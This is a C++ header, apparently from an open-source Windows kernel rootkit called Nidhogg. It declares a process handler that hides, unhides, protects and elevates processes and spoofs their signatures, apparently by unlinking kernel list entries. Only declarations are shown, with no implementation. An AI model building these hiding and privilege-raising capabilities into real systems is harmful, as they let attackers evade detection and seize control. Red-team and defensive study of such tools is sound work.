#pragma once
#include "pch.h"
#include "ListHelper.hpp"
#include "MemoryHelper.hpp"
#include "ProcessHelper.h"

extern "C" {
	#include "WindowsTypes.h"
}
#include "NidhoggCommon.h"
#include "MemoryUtils.h"

// Structs
enum class ProcessType {
	Protected,
	Hidden,
	All
};

struct IoctlProcessEntry {
	ULONG Pid;
	bool Remove;
};

struct IoctlProcessList {
	ProcessType Type;
	SIZE_T Count;
	ULONG* Processes;
};

struct ProtectedProcessEntry {
	LIST_ENTRY Entry;
	ULONG Pid;
};

struct HiddenProcessEntry {
	LIST_ENTRY Entry;
	ULONG Pid;
	PLIST_ENTRY OriginalEntry;
};

struct ProcessList {
	SIZE_T Count;
	FastMutex Lock;
	PLIST_ENTRY Items;
};

struct ProcessSignature {
	ULONG Pid;
	UCHAR SignerType;
	UCHAR SignatureSigner;
};

class ProcessHandler {
private:
	ProcessList protectedProcesses;
	ProcessList hiddenProcesses;

	void RemoveListLinks(PLIST_ENTRY current);
	void AddListLinks(PLIST_ENTRY current, PLIST_ENTRY target);

	_IRQL_requires_max_(APC_LEVEL)
	bool AddHiddenProcess(_In_ HiddenProcessEntry hiddenProcess);

public:
	void* operator new(size_t size) noexcept {
		return AllocateMemory<PVOID>(size, false);
	}

	void operator delete(void* p) {
		if (p)
			ExFreePoolWithTag(p, DRIVER_TAG);
	}

	_IRQL_requires_max_(APC_LEVEL)
	ProcessHandler() noexcept;

	_IRQL_requires_max_(APC_LEVEL)
	~ProcessHandler();

	_IRQL_requires_max_(DISPATCH_LEVEL)
	bool FindProcess(_In_ ULONG pid, _In_ ProcessType type) const;

	_IRQL_requires_max_(APC_LEVEL)
	bool ProtectProcess(_In_ ULONG pid);

	_IRQL_requires_max_(APC_LEVEL)
	bool RemoveProcess(_In_ ULONG pid, _In_ ProcessType type);

	_IRQL_requires_max_(APC_LEVEL)
	void ClearProcessList(_In_ ProcessType type);

	_IRQL_requires_max_(APC_LEVEL)
	bool ListProtectedProcesses(_Inout_ IoctlProcessList* processList);

	_IRQL_requires_max_(APC_LEVEL)
	bool ListHiddenProcesses(_Inout_ IoctlProcessList* processList);

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS ElevateProcess(_In_ ULONG pid);

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS SetProcessSignature(_In_ ProcessSignature* ProcessSignature);

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS UnhideProcess(_In_ ULONG pid);

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS HideProcess(_In_ ULONG pid);
};

inline ProcessHandler* NidhoggProcessHandler;

OB_PREOP_CALLBACK_STATUS OnPreOpenProcess(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION Info);
